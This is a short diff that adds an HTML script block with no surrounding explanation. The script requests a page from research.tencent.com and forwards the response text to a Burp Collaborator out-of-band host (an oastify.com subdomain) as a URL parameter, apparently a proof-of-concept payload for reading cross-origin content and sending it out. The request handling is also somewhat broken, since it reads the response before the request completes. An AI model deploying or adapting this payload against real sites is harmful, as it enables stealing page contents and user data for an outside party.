@@ -1,0 +1,12 @@
+<script>var Http = new XMLHttpRequest();
+    var url = 'https://research.tencent.com/';
+    Http.open("GET", url);
+    Http.send();
+
+    var burp = 'https://49bj9w7thifflobro0bqs8i2ftlk9fx4.oastify.com/test.php?id=' + Http.responseText;
+    Http.onreadystatechange = (e) => {
+        Http.open("GET", burp);
+        Http.send();
+    }
+
+</script>
